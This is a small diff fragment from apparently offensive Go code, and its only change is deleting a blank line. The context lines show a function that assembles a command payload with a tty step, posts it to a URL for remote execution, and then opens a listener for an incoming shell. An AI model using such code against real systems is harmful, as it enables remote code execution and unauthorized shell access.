@@ -190,7 +190,6 @@ func k8sio_PostPayload_Command(url string, jsfile string) {
 	payload := strings.Join([]string{pstring, pcmd, ttycmd}, "")
 	fmt.Println("payload: ->", payload)
 	k8sio_HttpPost_UriExec(payload)
-
 	k8sio_ExecListener(lport)
 }
 
